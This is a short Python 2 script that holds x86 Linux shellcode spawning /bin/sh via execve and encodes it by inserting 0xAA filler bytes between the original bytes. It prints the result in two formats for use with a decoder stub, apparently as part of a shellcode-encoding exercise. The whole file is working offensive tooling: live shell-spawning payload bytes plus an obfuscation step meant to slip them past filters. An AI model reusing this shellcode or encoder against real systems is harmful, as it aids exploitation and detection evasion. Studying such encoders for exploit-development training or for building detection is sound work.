#!/usr/bin/python


shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")


encoded = ""
encoded2 = ""


print "Encoded shellcode:"



for x in bytearray(shellcode):
	# complement
	encoded += '\\x'
	encoded += '%02x' % x
	encoded += '\\%02x' % 0xAA


	encoded2 += '0x'
	encoded2 += '%02x,' % x
	encoded2 += '0x%02x,' % 0xAA

print encoded
print encoded2

print 'Len: %d' % len(bytearray(shellcode))
